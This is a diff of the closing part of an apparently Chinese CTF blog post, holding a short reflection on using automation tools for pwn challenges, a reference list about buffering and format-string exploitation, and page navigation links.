+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>​        </p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
+<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
 <p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
 <p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf">difference between %ms and %s scanf</a></p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">格式化字符串</a></p>
 <p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>
+<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33976344/article/details/113503914">pwntools中fmtstr的使用</a></p>
+<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">3.1.1 格式化字符串漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CLHugh/article/details/75000104">Python中self用法详解</a></p>
 </li>
 </ul>
+<p>​    </p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="../../27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/" style="float: left;">
-        ← gdb附加调试的一些黑魔法
+    <a class="pull-left" href="../../20/PicoCTF_2018_got-shell/" style="float: left;">
+        ← PicoCTF_2018_got-shell
     </a>
     
     
-    <a class="pull-right" href="../../13/pwn%E5%9F%BA%E7%A1%80/">
-        汇编小知识点 →
+    <a class="pull-right" href="../../18/week-4.1/">
+        search engine →
     </a>
     
 </nav>
